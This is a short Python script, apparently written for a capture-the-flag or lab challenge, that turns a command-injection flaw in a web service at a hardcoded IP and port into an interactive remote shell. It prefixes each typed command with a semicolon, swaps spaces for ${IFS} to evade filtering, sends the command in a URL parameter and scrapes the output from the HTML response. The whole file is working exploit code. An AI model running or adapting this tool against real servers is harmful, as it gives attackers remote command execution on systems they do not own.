import requests
from urllib.parse import quote
from bs4 import BeautifulSoup

host = '46.101.39.71'
port = 32553

url = f'http://{host}:{port}/?command='
prompt = '\033[91m$ \033[0m'


def exec(cmd):
	cmd = cmd.replace(' ', '${IFS}')
	cur = url + quote(cmd)
	r = requests.get(cur)
	soup = BeautifulSoup(r.text, "lxml")
	outp = str(soup.pre)[5:-6]
	if outp and not outp.endswith('\n'):
	    outp += '\n'
	return outp

while True:
    cmd = '; ' + input(prompt)
    outp = exec(cmd)
    print(outp, end='')